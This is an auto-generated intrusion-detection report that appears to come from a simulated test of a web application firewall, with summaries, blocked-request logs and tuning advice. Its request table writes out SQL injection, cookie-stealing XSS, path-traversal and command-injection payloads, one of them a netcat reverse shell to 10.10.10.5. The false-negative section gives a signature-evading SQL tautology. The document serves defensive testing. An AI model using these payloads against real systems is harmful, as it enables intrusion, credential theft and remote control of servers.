# SentinelShield — Intrusion Detection & Web Protection Report

*Generated: 2026-10-20 22:42:14  ·  source: `logs.db`*

---

## 1. Executive Summary

- **Total requests inspected:** 57
- **Malicious / abusive requests blocked or flagged:** 30 (52% of traffic)
  - BLOCKED: **29** · FLAGGED: **1**
- **Legitimate requests allowed through:** 27
- **Distinct IPs flagged:** 9
- **Detection rules loaded:** see rules.yaml (6 categories fired)

## 2. Detection Summary by Attack Category

| Attack Category | Detected | Share of Attacks |
|---|---:|---:|
| Rate Limit / Abuse | 15 | 50.0% |
| SQL Injection | 4 | 13.3% |
| Cross-Site Scripting (XSS) | 4 | 13.3% |
| LFI / Directory Traversal | 3 | 10.0% |
| Command Injection | 3 | 10.0% |
| Suspicious Encoding | 1 | 3.3% |
| **TOTAL** | **30** | **100%** |

## 3. Repeatedly Flagged IP Addresses

| IP Address | Events | Blocked | Category Mix |
|---|---:|---:|---|
| `203.0.113.66` | 15 | 14 | Rate Limit / Abuse (15) |
| `51.79.120.3` | 3 | 3 | Cross-Site Scripting (XSS) (3) |
| `194.26.29.113` | 3 | 3 | LFI / Directory Traversal (3) |
| `185.199.108.153` | 3 | 3 | Command Injection (3) |
| `103.44.55.1` | 2 | 2 | SQL Injection (2) |
| `91.203.145.7` | 1 | 1 | Suspicious Encoding (1) |
| `91.203.145.6` | 1 | 1 | Cross-Site Scripting (XSS) (1) |
| `45.132.88.7` | 1 | 1 | SQL Injection (1) |
| `10.0.0.77` | 1 | 1 | SQL Injection (1) |

## 4. Detected Attacks & Triggering Signature

| Rule ID | Category | Times Fired |
|---|---|---:|
| `RATE-001` | Rate Limit / Abuse | 15 |
| `CMDI-001` | Command Injection | 3 |
| `SQLI-002` | SQL Injection | 2 |
| `XSS-001` | Cross-Site Scripting (XSS) | 2 |
| `XSS-002` | Cross-Site Scripting (XSS) | 2 |
| `LFI-001` | LFI / Directory Traversal | 2 |
| `SQLI-001` | SQL Injection | 1 |
| `LFI-003` | LFI / Directory Traversal | 1 |
| `ENC-001` | Suspicious Encoding | 1 |
| `SQLI-004` | SQL Injection | 1 |

<details><summary>Full chronological list of blocked/flagged requests</summary>

| Time | IP | Method | Path | Category | Verdict | Rule |
|---|---|---|---|---|---|---|
| 22:41:56 | `103.44.55.1` | GET | `/search?q=%27+UNION+SELECT+username%2Cpassword+FROM+users--` | SQL Injection | **BLOCKED** | `SQLI-001` |
| 22:41:56 | `103.44.55.1` | GET | `/login?next=%27+OR+1%3D1--` | SQL Injection | **BLOCKED** | `SQLI-002` |
| 22:41:56 | `45.132.88.7` | POST | `/login` | SQL Injection | **BLOCKED** | `SQLI-002` |
| 22:41:56 | `51.79.120.3` | GET | `/search?q=%3Cscript%3Edocument.cookie%3C%2Fscript%3E` | Cross-Site Scripting (XSS) | **BLOCKED** | `XSS-001` |
| 22:41:56 | `51.79.120.3` | GET | `/search?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E` | Cross-Site Scripting (XSS) | **BLOCKED** | `XSS-002` |
| 22:41:56 | `51.79.120.3` | GET | `/search?q=javascript%3Aalert%28document.cookie%29` | Cross-Site Scripting (XSS) | **BLOCKED** | `XSS-002` |
| 22:41:56 | `194.26.29.113` | GET | `/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd` | LFI / Directory Traversal | **BLOCKED** | `LFI-001` |
| 22:41:56 | `194.26.29.113` | GET | `/view?file=..%252f..%252f..%252fetc%252fshadow` | LFI / Directory Traversal | **BLOCKED** | `LFI-001` |
| 22:41:56 | `194.26.29.113` | GET | `/view?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dind` | LFI / Directory Traversal | **BLOCKED** | `LFI-003` |
| 22:41:56 | `185.199.108.153` | GET | `/search?q=%3B+cat+%2Fetc%2Fpasswd` | Command Injection | **BLOCKED** | `CMDI-001` |
| 22:41:56 | `185.199.108.153` | GET | `/search?q=%7C+whoami` | Command Injection | **BLOCKED** | `CMDI-001` |
| 22:41:57 | `185.199.108.153` | GET | `/search?q=%24%28nc+10.10.10.5+4444+-e+%2Fbin%2Fsh%29` | Command Injection | **BLOCKED** | `CMDI-001` |
| 22:41:57 | `91.203.145.6` | GET | `/search?q=%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript` | Cross-Site Scripting (XSS) | **BLOCKED** | `XSS-001` |
| 22:41:57 | `91.203.145.7` | GET | `/search?q=%01%02%03%04%05%06%07%08%09%0A%0B%0C` | Suspicious Encoding | **BLOCKED** | `ENC-001` |
| 22:42:02 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **FLAGGED** | `RATE-001` |
| 22:42:02 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:02 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:03 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:03 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:03 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:03 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:03 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:03 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:04 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:05 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:05 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:05 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:05 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:05 | `203.0.113.66` | POST | `/login` | Rate Limit / Abuse | **BLOCKED** | `RATE-001` |
| 22:42:06 | `10.0.0.77` | GET | `/search?q=how+to+drop+table+in+sql+tutorial` | SQL Injection | **BLOCKED** | `SQLI-004` |

</details>

## 5. False Positives / False Negative Analysis

Edge cases are seeded deliberately by `simulator.py` and matched to logged verdicts via the `X-Sim-Id` correlation header.

- **Seeded probes evaluated:** 57
- **Correctly detected (true positives):** 29
- **False positives (blocked but benign):** 1
- **False negatives (malicious but allowed):** 1
- **Brute-force burst (35 requests):** stopped mid-burst ✓ (early requests are allowed by design until the sliding window fills)

### False Positives

| Payload | Expected | Actual | Why it happened |
|---|---|---|---|
| `search?q=how to drop table in sql tutorial` | ALLOWED | **BLOCKED** | innocent search containing SQL keywords (expected FP) — matched `SQLI-004` |

*Cause:* signature `SQLI-*` matches raw keyword patterns, so a legit phrase like “drop table” in natural language trips it. **Mitigation:** add a keyword-count / context threshold, or whitelist search fields with a word-boundary + quoting check.

### False Negatives

| Payload | Expected | Actual | Evasion technique |
|---|---|---|---|
| `search?q='OR(1=1)AND'1'='1` | BLOCKED | **ALLOWED** | whitespace-free MySQL tautology — evades literal-whitespace signatures (expected FN) |

*Cause:* SQLI-002 requires literal whitespace after `OR`/`AND` and SQLI-003 requires a comment/terminator tail — removing both (no space, no `--`) evades every current regex while MySQL still executes the tautology. **Mitigation:** normalise before matching (expand keyword-boundary rules to `OR(`, strip `/**/`, collapse whitespace variants), or add a lightweight anomaly score alongside signatures.

## 6. Security Recommendations

1. **Parameterised queries** — the demo login concatenates SQL; use prepared statements/ORM everywhere (CWE-89).
2. **Contextual output encoding** on the search reflection path plus a CSP header with `script-src 'self'` (CWE-79).
3. **Canonicalise paths and allow-list filenames** for `/view`; reject `..` after `realpath()` (CWE-22).
4. **Never pass user input to a shell** — use `execve`-style argv arrays or disable shell features (CWE-78).
5. **Rate limiting is active** (20/10s, 30s cooldown). Consider jail+exponential backoff for repeated offenders, and persisting flagged IPs across restarts.
6. **Tune signatures** using the FP/FN section above: add normalisation before matching to close the FN gap, and context checks to reduce FP noise.
7. **Layer defences**: WAF signatures are a first line — pair with HSTS, strict CSP, `X-Content-Type-Options`, and regular patch cycles.

---
*Report generated by SentinelShield `report.py`.*